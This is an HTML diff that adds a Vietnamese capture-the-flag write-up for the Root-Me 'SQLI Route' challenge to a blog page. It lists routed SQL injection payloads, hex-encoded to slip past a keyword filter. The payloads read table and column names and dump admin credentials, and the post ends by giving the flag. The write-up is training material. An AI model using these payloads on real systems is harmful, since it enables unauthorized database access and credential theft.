@@ -97,7 +97,7 @@
             <div class="row">
               <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
                 <div class="post-heading">
-                  <h1>Root me: SQLI - ErrorBased</h1>
+                  <h1>Root me: SQLI ErrorBased</h1>
                   <span class="post-meta">Posted on March 27, 2024</span>
                 </div>
               </div>
@@ -142,6 +142,61 @@
             </div>
         </div>
     </div>
+    <header class="header-section ">
+      <div class="intro-header no-img">
+        <div class="container">
+          <div class="row">
+            <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+              <div class="post-heading">
+                <h1>Root me: SQLI Route</h1>
+                <span class="post-meta">Posted on March 27, 2024</span>
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+    </header>
+    <div class="container">
+      <div class="row">
+          <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+              <article role="main" class="blog-post">
+                  <h2 id="english-below">[WRITE - UP]</h2>     
+                      <p><a href="http://challenge01.root-me.org/web-serveur/ch49/index.php">Link challenge</a>    
+                    <p>Đầu tiên thử login <strong>Username: admin -- Password: admin thì lỗi</strong></p>      
+                    <p><img src="../../img/sqli_route.png" alt="sqli.PNG" /></p> 
+                    <p>Có vẻ khó bypass qua form login này, mình chuyển sang test ở tab <strong>Search</strong></p>
+                    <p>Khi query của mình đều nhận được và web trả về dựa trên query.</p>
+      
+                    <p class="box-note">' UNION SELECT 1-- -</p>      
+                    <p><img src="../../img/sqli_route1.png" alt="sqli.PNG" /></p>
+                    <p>Có thể thấy giá trị 1 vẫn được trả về, vậy sẽ như thế nào nếu mình đặt 1 câu query khác vào vị trí input 1 này.</p>
+                    <p class="box-note">' union select ' order by 3-- -</p>
+                    <p>Không như mơ.... kết quả trả về <strong>Attack detected!</strong> Có vẻ như đã bị filter 1 số kí tự và từ khóa liên quan đến SQLI, tuy nhiên UNION, SELECT thì không bị filter.
+                        Đề bài đề cập đến <strong>Routed</strong> Nghĩa là, khi ta inject với union select thì sẽ không thể thấy được output của câu inject đó.
+                    </p>
+                    <p>Vì 1 số kí tự đã bị filter nên mình sẽ HEX câu Query 2 để lòng vào Query 1.</p>
+                    <p class="box-note">' union select 0x27206f7264657220627920332d2d202d-- -</p>
+                    <p><img src="../../img/sqli_route2.png" alt="sqli.png" /></p>
+                    <p>Vậy là xác định được số cột rồi, tiến hành lấy tên bảng thôi, sau khi HEX sẽ được payload</p>
+                    <p class="box-note">' union select 0x2720756e696f6e2073656c65637420312c7461626c655f6e616d652066726f6d206
+                      96e666f726d6174696f6e5f736368656d612e7461626c6573207768657265207461626c
+                      655f736368656d613d646174616261736528292d2d202d-- -</p>
+                    <p><img src="../../img/sqli_route6.png" alt="sqli.png" /></p>           
+                    <p>Ta đã có Table giờ lấy dữ liệu ra thôi^^</p>    
+                    <p class="box-note">' union select 0x2720756e696f6e2073656c65637420312c67726f75705f636f6e63617428636f6c75
+                      6d6e5f6e616d65292066726f6d20696e666f726d6174696f6e5f736368656d612e636f6c
+                      756d6e73207768657265207461626c655f6e616d653d277573657273272d2d202d-- -</p>
+                    <p><img src="../../img/sqli_route4.png" alt="sqli.png" /></p>
+                    <p>Và ta đã tìm được 2 cột <strong>login, password</strong>, lấy data ra thui nào!!</p>
+                    <p class="box-note">' union select 0x2720756e696f6e2073656c65637420312c67726f75705f636f6e636174286c6f67696
+                      e2c273a272c70617373776f7264292066726f6d2075736572732d2d202d-- -</p>
+                    <p><img src="../../img/sqli_route5.png" alt="sqli.png" /></p>
+                    <p><strong>admin : qs89QdAs9A</strong></p>
+                    <p class="box-note">Flag: qs89QdAs9A</p>
+            </article>
+          </div>
+      </div>
+  </div>
               <script>
                 if (typeof jQuery == 'undefined') {
                   document.write('<script src="../../js/jquery-1.11.2.min.js"></scr' + 'ipt>');
